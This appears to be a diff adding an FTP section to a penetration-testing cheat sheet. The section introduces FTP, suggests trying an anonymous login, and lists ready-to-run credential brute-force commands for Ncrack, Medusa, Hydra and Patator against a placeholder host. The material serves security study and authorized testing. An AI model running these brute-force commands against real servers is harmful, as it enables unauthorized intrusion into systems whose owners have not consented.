@@ -6,6 +6,46 @@ order: 1
 
 # Introduction
 
+FTP (File Transfer Protocol) is used to communicate and transfer files between computers on a TCP/IP (Transmission Control Protocol/Internet Protocol) network, aka the internet. Users, who have been granted access, can receive and transfer files in the File Transfer Protocol server (also known as FTP host/site).
+
+# Anonymous User
+
+In some devices anonymous user is enabled. It's important to give it a try.
+
+```
+ftp 10.10.10.10
+name: anonymous
+pass
+```
+
+# Bruteforcing Credentials
+
+To bruteforce the login in order to find valid credentials we can use different tools:
+
+* Ncrack
+```
+ncrack -U usernames.txt -P passowrds.txt ftp://10.10.10.10 -v
+ncrack -u root -P passowrds.txt ftp://10.10.10.10 -v
+```
+
+* Medusa
+```
+medusa -h 10.10.10.10 -U usernames.txt -P passowrds.txt -M ftp
+medusa -h 10.10.10.10 -u root -P passowrds.txt -M ftp
+```
+
+* Hydra
+```
+hydra -L usernames.txt -P passwords.txt ftp://10.10.10.10 -s 21
+hydra -l root -P passwords.txt ftp://10.10.10.10 -s 21
+```
+
+* Patator
+```
+patator ftp_login host=10.10.10.10 user=FILE0 password=FILE1 0=usernames.txt 1=passwords.txt -x ignore:mesg='Login incorrect.'
+patator ftp_login host=10.10.10.10 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Login incorrect.'
+```
+
 # FileZilla Server (From LFI)
 
 ## FileZilla Server credentials
